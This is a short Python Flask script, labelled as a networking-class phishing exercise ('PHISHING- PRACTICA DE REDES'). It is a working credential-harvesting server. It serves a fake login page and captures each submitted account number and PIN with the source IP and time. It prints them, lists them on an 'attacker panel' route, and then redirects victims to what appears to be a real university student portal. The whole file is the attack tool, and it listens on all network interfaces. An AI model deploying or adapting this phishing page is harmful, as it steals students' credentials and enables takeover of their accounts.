from flask import Flask, request, render_template, redirect
from datetime import datetime

app = Flask(__name__)

credenciales_capturadas = []

URL_REDIRECCION = "https://siia.uasnet.mx/alumnos/principal.php"

@app.route("/")
def login():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def capturar():
    cuenta = request.form.get("txtCuenta", "")
    nip = request.form.get("txtNip", "")
    ip_origen = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    datos = {
        "cuenta": cuenta,
        "nip": nip,
        "ip": ip_origen,
        "fecha": timestamp,
    }
    credenciales_capturadas.append(datos)

    print("\n" + "=" * 50)
    print("CREDENCIALES CAPTURADAS:")
    print(f"  Cuenta:   {cuenta}")
    print(f"  NIP:      {nip}")
    print(f"  IP:       {ip_origen}")
    print(f"  Fecha:    {timestamp}")
    print("=" * 50 + "\n")

    return redirect(URL_REDIRECCION)


@app.route("/panel")
def panel():
    return render_template("panel.html", credenciales=credenciales_capturadas)


if __name__ == "__main__":
    print("PHISHING- PRACTICA DE REDES")
    print(f"\n  Pagina falsa:    http://localhost:5000")
    print(f"  Panel atacante:  http://localhost:5000/panel")
    print(f"  Redirige a:      {URL_REDIRECCION}")

    app.run(host="0.0.0.0", port=5000, debug=True)